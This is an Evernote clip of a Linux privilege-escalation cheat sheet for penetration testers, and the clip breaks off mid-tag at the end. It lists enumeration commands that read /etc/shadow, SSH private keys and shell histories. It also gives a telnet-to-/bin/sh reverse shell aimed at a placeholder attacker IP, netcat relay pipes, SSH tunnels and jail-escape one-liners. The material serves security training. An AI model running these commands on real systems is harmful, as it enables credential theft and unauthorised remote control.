<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/><meta name="exporter-version" content="Evernote Mac 6.13.1 (455785)"/><meta name="keywords" content="OSCP, Privilege Escalation, Security"/><meta name="author" content="Anas"/><meta name="created" content="2018-01-05 16:06:43 +0000"/><meta name="source" content="Clearly"/><meta name="source-url" content="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/"/><meta name="updated" content="2018-01-12 16:04:52 +0000"/><title>Linux Privilege Escalation</title></head><body><div><a shape="rect" href="https://www.youtube.com/watch?v=dk2wsyFiosg" target="_blank">https://www.youtube.com/watch?v=dk2wsyFiosg</a><br clear="none"/></div><div><div><h1>Basic Linux Privilege Escalation</h1></div><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;">Before starting, I would like to point out - <span style="font-weight: bold;">I'm no expert</span>. As far as I know, there isn't a "magic" answer, in this huge area. This is simply my finding, typed up, to be shared <span style="font-style: italic;">(my</span> <a shape="rect" style="font-style: italic;" href="http://insidetrust.blogspot.com/2011/04/quick-guide-to-linux-privilege.html" target="_blank">starting point</a><span style="font-style: italic;">)</span>. Below is a mixture of commands to do the same thing, to look at things in a different place or just a different light. I know there more "things" to look for. It's just a <span style="font-weight: bold;">basic &amp; rough guide</span>. Not every command will work for each system as Linux varies so much. "It" will not jump off the screen - you've to hunt for that <span style="font-style: italic;">"little thing"</span> as "<span style="font-style: italic;">the devil is in the detail</span>".</div><h4>Enumeration is the key.</h4><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;">(Linux) privilege escalation is all about:</div><ul><li>Collect - <span style="font-style: italic; font-weight: bold;">Enumeration</span><span style="font-style: italic;">, more enumeration and some more enumeration.</span></li><li>Process - <span style="font-style: italic;">Sort through data,</span> <span style="font-style: italic; font-weight: bold;">analyse</span> <span style="font-style: italic;">and prioritisation.</span></li><li>Search - <span style="font-style: italic;">Know what to search for and where to</span> <span style="font-style: italic; font-weight: bold;">find</span> <span style="font-style: italic;">the exploit code.</span></li><li>Adapt - <span style="font-style: italic; font-weight: bold;">Customize</span> <span style="font-style: italic;">the exploit, so it fits. Not every exploit work for every system "out of the box".</span></li><li>Try - <span style="font-style: italic;">Get ready for (lots of)</span> <span style="font-style: italic; font-weight: bold;">trial and error</span><span style="font-style: italic;">.</span></li></ul><h2>Operating System</h2><h4>What's the distribution type? <span style="font-style: italic;">What version?</span></h4><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div><div>3</div><div>4</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 548px; padding: 8px;"><div>cat /etc/issue</div><div>cat /etc/*-release</div><div>cat /etc/lsb-release # Debian based</div><div>cat /etc/redhat-release # Redhat based</div></td></tr></table><div><br clear="none"/></div></div><h4>What's the kernel version? <span style="font-style: italic;">Is it 64-bit?</span></h4><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div><div>6</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 589px; padding: 8px;"><div>cat /proc/version</div><div>uname -a</div><div>uname -mrs</div><div>rpm -q kernel</div><div>dmesg | grep Linux</div><div>ls /boot | grep vmlinuz-</div></td></tr></table><div><br clear="none"/></div></div><h4>What can be learnt from the environmental variables?</h4><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div><div>6</div><div>7</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 400px; padding: 8px;"><div>cat /etc/profile</div><div>cat /etc/bashrc</div><div>cat ~/.bash_profile</div><div>cat ~/.bashrc</div><div>cat ~/.bash_logout</div><div>env</div><div>set</div></td></tr></table><div><br clear="none"/></div></div><h4>Is there a printer?</h4><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 130px; padding: 8px;"><div>lpstat -a</div></td></tr></table><div><br clear="none"/></div></div><h2>Applications &amp; Services</h2><h4>What services are running? <span style="font-style: italic;">Which service has which user privilege?</span></h4><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div><div>3</div><div>4</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 390px; padding: 8px;"><div>ps aux</div><div>ps -ef</div><div>top</div><div>cat /etc/services</div></td></tr></table><div><br clear="none"/></div></div><h4>Which service(s) are been running by <span style="font-style: italic;">root? Of these services, which are vulnerable - it's worth a double check!</span></h4><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 314px; padding: 8px;"><div>ps aux | grep root</div><div>ps -ef | grep root</div></td></tr></table><div><br clear="none"/></div></div><h4>What applications are installed? <span style="font-style: italic;">What version are they? Are they currently running?</span></h4><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div><div>6</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 536px; padding: 8px;"><div>ls -alh /usr/bin/</div><div>ls -alh /sbin/</div><div>dpkg -l</div><div>rpm -qa</div><div>ls -alh /var/cache/apt/archivesO</div><div>ls -alh /var/cache/yum/</div></td></tr></table><div><br clear="none"/></div></div><h4>Any of the service(s) settings misconfigured? <span style="font-style: italic;">Are any (vulnerable) plugins attached?</span></h4><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div><div>6</div><div>7</div><div>8</div><div>9</div><div>10</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 564px; padding: 8px;"><div>cat /etc/syslog.conf</div><div>cat /etc/chttp.conf</div><div>cat /etc/lighttpd.conf</div><div>cat /etc/cups/cupsd.conf</div><div>cat /etc/inetd.conf</div><div>cat /etc/apache2/apache2.conf</div><div>cat /etc/my.conf</div><div>cat /etc/httpd/conf/httpd.conf</div><div>cat /opt/lampp/etc/httpd.conf</div><div>ls -aRl /etc/ | awk '$1 ~ /^.*r.*/</div></td></tr></table><div><br clear="none"/></div></div><h4>What jobs are scheduled?</h4><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div><div>6</div><div>7</div><div>8</div><div>9</div><div>10</div><div>11</div><div>12</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 519px; padding: 8px;"><div>crontab -l</div><div>ls -alh /var/spool/cron</div><div>ls -al /etc/ | grep cron</div><div>ls -al /etc/cron*</div><div>cat /etc/cron*</div><div>cat /etc/at.allow</div><div>cat /etc/at.deny</div><div>cat /etc/cron.allow</div><div>cat /etc/cron.deny</div><div>cat /etc/crontab</div><div>cat /etc/anacrontab</div><div>cat /var/spool/cron/crontabs/root</div></td></tr></table><div><br clear="none"/></div></div><h4>Any plain text usernames and/or passwords?</h4><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div><div>3</div><div>4</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 577px; padding: 8px;"><div>grep -i user [filename]</div><div>grep -i pass [filename]</div><div>grep -C 5 "password" [filename]</div><div>find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password" # Joomla</div></td></tr></table><div><br clear="none"/></div></div><h2>Communications &amp; Networking</h2><h4>What NIC(s) does the system have? <span style="font-style: italic;">Is it connected to another network?</span></h4><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div><div>3</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 596px; padding: 8px;"><div>/sbin/ifconfig -a</div><div>cat /etc/network/interfaces</div><div>cat /etc/sysconfig/network</div></td></tr></table><div><br clear="none"/></div></div><h4>What are the network configuration settings? <span style="font-style: italic;">What can you find out about this network? DHCP server? DNS server? Gateway?</span></h4><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div><div>6</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 533px; padding: 8px;"><div>cat /etc/resolv.conf</div><div>cat /etc/sysconfig/network</div><div>cat /etc/networks</div><div>iptables -L</div><div>hostname</div><div>dnsdomainname</div></td></tr></table><div><br clear="none"/></div></div><h4>What other users &amp; hosts are communicating with the system?</h4><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div><div>6</div><div>7</div><div>8</div><div>9</div><div>10</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 591px; padding: 8px;"><div><div>ps aux | grep root</div></div><div>lsof -i :80</div><div>grep 80 /etc/services</div><div>netstat -antup</div><div>netstat -antpx</div><div>netstat -tulpn</div><div>chkconfig --list</div><div>chkconfig --list | grep 3:on</div><div>last</div><div>w</div></td></tr></table><div><br clear="none"/></div></div><h4>Whats cached? <span style="font-style: italic;">IP and/or MAC addresses</span></h4><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div><div>3</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 237px; padding: 8px;"><div>arp -e</div><div>route</div><div>/sbin/route -nee</div></td></tr></table><div><br clear="none"/></div></div><h4>Is packet sniffing possible? What can be seen? <span style="font-style: italic;">Listen to live traffic</span></h4><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 483px; padding: 8px;"><div>tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21</div></td></tr></table><div><br clear="none"/></div></div><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;"><span style="font-style: italic;">Note: tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]</span></div><h4>Have you got a shell? <span style="font-style: italic;">Can you interact with the system?</span></h4><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div><div>3</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 640px; padding: 8px;"><div>nc -lvp 4444 # Attacker. Input (Commands)</div><div>nc -lvp 4445 # Attacker. Ouput (Results)</div><div>telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445 # On the targets system. Use the attackers IP!</div></td></tr></table><div><br clear="none"/></div></div><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;"><span style="font-style: italic;">Note:</span> <a shape="rect" style="font-style: italic;" href="http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/" target="_blank">http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/</a><br clear="none"/></div><h4>Is port forwarding possible? <span style="font-style: italic;">Redirect and interact with traffic from another view</span></h4><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;"><span style="font-style: italic;">Note:</span> <a shape="rect" style="font-style: italic;" href="http://www.boutell.com/rinetd/" target="_blank">http://www.boutell.com/rinetd/</a><br clear="none"/></div><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;"><span style="font-style: italic;">Note:</span> <a shape="rect" style="font-style: italic;" href="http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch" target="_blank">http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch</a><br clear="none"/></div><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;"><span style="font-style: italic;">Note:</span> <a shape="rect" style="font-style: italic;" href="http://downloadcenter.mcafee.com/products/tools/foundstone/fpipe2_1.zip" target="_blank">http://downloadcenter.mcafee.com/products/tools/foundstone/fpipe2_1.zip</a><br clear="none"/></div><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;"><span style="font-style: italic;">Note: FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]</span></div><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 571px; padding: 8px;"><div>FPipe.exe -l 80 -r 80 -s 80 192.168.1.7</div></td></tr></table><div><br clear="none"/></div></div><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;"><span style="font-style: italic;">Note: ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]</span></div><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 586px; padding: 8px;"><div>ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port</div><div>ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port</div></td></tr></table><div><br clear="none"/></div></div><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;"><span style="font-style: italic;">Note: mknod backpipe p ; nc -l -p [remote port] &lt; backpipe | nc [local IP] [local port] &gt;backpipe</span></div><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div><div>3</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 985px; padding: 8px;"><div>mknod backpipe p ; nc -l -p 8080 &lt; backpipe | nc 10.5.5.151 80 &gt;backpipe # Port Relay</div><div>mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1&gt;backpipe # Proxy (Port 80 to 8080)</div><div>mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow &amp; 1&gt;backpipe # Proxy monitor (Port 80 to 8080)</div></td></tr></table><div><br clear="none"/></div></div><h4>Is tunnelling possible? <span style="font-style: italic;">Send commands locally, remotely</span></h4><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 537px; padding: 8px;"><div>ssh -D 127.0.0.1:9050 -N [username]@[ip]</div><div>proxychains ifconfig</div></td></tr></table><div><br clear="none"/></div></div><h2>Confidential Information &amp; Users</h2><h4>Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?</h4><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div><div>6</div><div>7</div><div>8</div><div>9</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 695px; padding: 8px;"><div>id</div><div>who</div><div>w</div><div>last</div><div>cat /etc/passwd | cut -d: -f1 # List of users</div><div>grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}' # List of super users</div><div>awk -F: '($3 == "0") {print}' /etc/passwd # List of super users</div><div>cat /etc/sudoers</div><div>sudo -l</div></td></tr></table><div><br clear="none"/></div></div><h4>What sensitive files can be found?</h4><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div><div>3</div><div>4</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 352px; padding: 8px;"><div>cat /etc/passwd</div><div>cat /etc/group</div><div>cat /etc/shadow</div><div>ls -alh /var/mail/</div></td></tr></table><div><br clear="none"/></div></div><h4>Anything "interesting" in the home directorie(s)? <span style="font-style: italic;">If it's possible to access</span></h4><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 195px; padding: 8px;"><div>ls -ahlR /root/</div><div>ls -ahlR /home/</div></td></tr></table><div><br clear="none"/></div></div><h4>Are there any passwords in; scripts, databases, configuration files or log files? <span style="font-style: italic;">Default paths and locations for passwords</span></h4><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div><div>3</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 452px; padding: 8px;"><div>cat /var/apache2/config.inc</div><div>cat /var/lib/mysql/mysql/user.MYD</div><div>cat /root/anaconda-ks.cfg</div></td></tr></table><div><br clear="none"/></div></div><h4>What has the user being doing? <span style="font-style: italic;">Is there any password in plain text? What have they been edting?</span></h4><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 240px; padding: 8px;"><div>cat ~/.bash_history</div><div>cat ~/.nano_history</div><div>cat ~/.atftp_history</div><div>cat ~/.mysql_history</div><div>cat ~/.php_history</div></td></tr></table><div><br clear="none"/></div></div><h4>What user information can be found?</h4><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div><div>3</div><div>4</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 380px; padding: 8px;"><div>cat ~/.bashrc</div><div>cat ~/.profile</div><div>cat /var/mail/root</div><div>cat /var/spool/mail/root</div></td></tr></table><div><br clear="none"/></div></div><h4>Can private-key information be found?</h4><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div><div>6</div><div>7</div><div>8</div><div>9</div><div>10</div><div>11</div><div>12</div><div>13</div><div>14</div><div>15</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 502px; padding: 8px;"><div>cat ~/.ssh/authorized_keys</div><div>cat ~/.ssh/identity.pub</div><div>cat ~/.ssh/identity</div><div>cat ~/.ssh/id_rsa.pub</div><div>cat ~/.ssh/id_rsa</div><div>cat ~/.ssh/id_dsa.pub</div><div>cat ~/.ssh/id_dsa</div><div>cat /etc/ssh/ssh_config</div><div>cat /etc/ssh/sshd_config</div><div>cat /etc/ssh/ssh_host_dsa_key.pub</div><div>cat /etc/ssh/ssh_host_dsa_key</div><div>cat /etc/ssh/ssh_host_rsa_key.pub</div><div>cat /etc/ssh/ssh_host_rsa_key</div><div>cat /etc/ssh/ssh_host_key.pub</div><div>cat /etc/ssh/ssh_host_key</div></td></tr></table><div><br clear="none"/></div></div><h2>File Systems</h2><h4>Which configuration files can be written in /etc/? <span style="font-style: italic;">Able to reconfigure a service?</span></h4><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div><div>6</div><div>7</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 585px; padding: 8px;"><div>ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2&gt;/dev/null # Anyone</div><div>ls -aRl /etc/ | awk '$1 ~ /^..w/' 2&gt;/dev/null # Owner</div><div>ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2&gt;/dev/null # Group</div><div>ls -aRl /etc/ | awk '$1 ~ /w.$/' 2&gt;/dev/null # Other</div><div>find /etc/ -readable -type f 2&gt;/dev/null # Anyone</div><div>find /etc/ -readable -type f -maxdepth 1 2&gt;/dev/null # Anyone</div></td></tr></table><div><br clear="none"/></div></div><h4>What can be found in /var/ ?</h4><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div><div>6</div><div>7</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 516px; padding: 8px;"><div>ls -alh /var/log</div><div>ls -alh /var/mail</div><div>ls -alh /var/spool</div><div>ls -alh /var/spool/lpd</div><div>ls -alh /var/lib/pgsql</div><div>ls -alh /var/lib/mysql</div><div>cat /var/lib/dhcp3/dhclient.leases</div></td></tr></table><div><br clear="none"/></div></div><h4>Any settings/files (hidden) on website? <span style="font-style: italic;">Any settings file with database information?</span></h4><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 420px; padding: 8px;"><div>ls -alhR /var/www/</div><div>ls -alhR /srv/www/htdocs/</div><div>ls -alhR /usr/local/www/apache22/data/</div><div>ls -alhR /opt/lampp/htdocs/</div><div>ls -alhR /var/www/html/</div></td></tr></table><div><br clear="none"/></div></div><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;">Is there anything in the log file(s) <span style="font-style: italic;">(Could help with "Local File Includes"!)</span></div><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div><div>6</div><div>7</div><div>8</div><div>9</div><div>10</div><div>11</div><div>12</div><div>13</div><div>14</div><div>15</div><div>16</div><div>17</div><div>18</div><div>19</div><div>20</div><div>21</div><div>22</div><div>23</div><div>24</div><div>25</div><div>26</div><div>27</div><div>28</div><div>29</div><div>30</div><div>31</div><div>32</div><div>33</div><div>34</div><div>35</div><div>36</div><div>37</div><div>38</div><div>39</div><div>40</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 497px; padding: 8px;"><div>cat /etc/httpd/logs/access_log</div><div>cat /etc/httpd/logs/access.log</div><div>cat /etc/httpd/logs/error_log</div><div>cat /etc/httpd/logs/error.log</div><div>cat /var/log/apache2/access_log</div><div>cat /var/log/apache2/access.log</div><div>cat /var/log/apache2/error_log</div><div>cat /var/log/apache2/error.log</div><div>cat /var/log/apache/access_log</div><div>cat /var/log/apache/access.log</div><div>cat /var/log/auth.log</div><div>cat /var/log/chttp.log</div><div>cat /var/log/cups/error_log</div><div>cat /var/log/dpkg.log</div><div>cat /var/log/faillog</div><div>cat /var/log/httpd/access_log</div><div>cat /var/log/httpd/access.log</div><div>cat /var/log/httpd/error_log</div><div>cat /var/log/httpd/error.log</div><div>cat /var/log/lastlog</div><div>cat /var/log/lighttpd/access.log</div><div>cat /var/log/lighttpd/error.log</div><div>cat /var/log/lighttpd/lighttpd.access.log</div><div>cat /var/log/lighttpd/lighttpd.error.log</div><div>cat /var/log/messages</div><div>cat /var/log/secure</div><div>cat /var/log/syslog</div><div>cat /var/log/wtmp</div><div>cat /var/log/xferlog</div><div>cat /var/log/yum.log</div><div>cat /var/run/utmp</div><div>cat /var/webmin/miniserv.log</div><div>cat /var/www/logs/access_log</div><div>cat /var/www/logs/access.log</div><div>ls -alh /var/lib/dhcp3/</div><div>ls -alh /var/log/postgresql/</div><div>ls -alh /var/log/proftpd/</div><div>ls -alh /var/log/samba/</div><div>Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp</div></td></tr></table><div><br clear="none"/></div></div><div style="margin-top: 1em; margin-bottom: 1em; -en-paragraph: true;"><span style="font-style: italic;">Note:</span> <a shape="rect" style="font-style: italic;" href="http://www.thegeekstuff.com/2011/08/linux-var-log-files/" target="_blank">http://www.thegeekstuff.com/2011/08/linux-var-log-files/</a><br clear="none"/></div><h4>If commands are limited, you break out of the "jail" shell?</h4><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div><div>3</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 438px; padding: 8px;"><div>python -c 'import pty;pty.spawn("/bin/bash")'</div><div>echo os.system('/bin/bash')</div><div>/bin/sh -i</div></td></tr></table><div><br clear="none"/></div></div><h4>How are file-systems mounted?</h4><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 130px; padding: 8px;"><div>mount</div><div>df -h</div></td></tr></table><div><br clear="none"/></div></div><h4>Are there any unmounted file-systems?</h4><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 190px; padding: 8px;"><div>cat /etc/fstab</div></td></tr></table><div><br clear="none"/></div></div><h4>What "Advanced Linux File Permissions" are used? <span style="font-style: italic;">Sticky bits, SUID &amp; GUID</span></h4><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div><div>6</div><div>7</div><div>8</div><div>9</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 1015px; padding: 8px;"><div>find / -perm -1000 -type d 2&gt;/dev/null # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.</div><div>find / -perm -g=s -type f 2&gt;/dev/null # SGID (chmod 2000) - run as the group, not the user who started it.</div><div>find / -perm -u=s -type f 2&gt;/dev/null # SUID (chmod 4000) - run as the owner, not the user who started it.</div><div>find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null # SGID or SUID</div><div>for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)</div><div># find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)</div><div>find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2&gt;/dev/null</div></td></tr></table><div><br clear="none"/></div></div><h4>Where can written to and executed from? <span style="font-style: italic;">A few 'common' places: /tmp, /var/tmp, /dev/shm</span></h4><div><div><br clear="none"/></div><table style="border-collapse: collapse; min-width: 100%;"><tr><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 49px; padding: 8px;"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div><div>6</div><div>7</div></td><td colspan="1" rowspan="1" style="border: 1px solid #cccccc; width: 825px; padding: 8px;"><div>find / -writable -type d 2&gt;/dev/null # world-writeable folders</div><div>find / -perm -222 -type d 2&gt;/dev/null # world-writeable folders</div><div>find / -perm -o w -type d 2&gt;/dev/null # world-writeable folders</div><div>find / -perm -o x -type d 2&gt;/dev/null # world-executable folders</div><div>find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null # world-writeable &amp; executable folders</div></td></tr></table><div><br clear="none"/></div></div><h4>Any "problem" files? <span style="font-style: 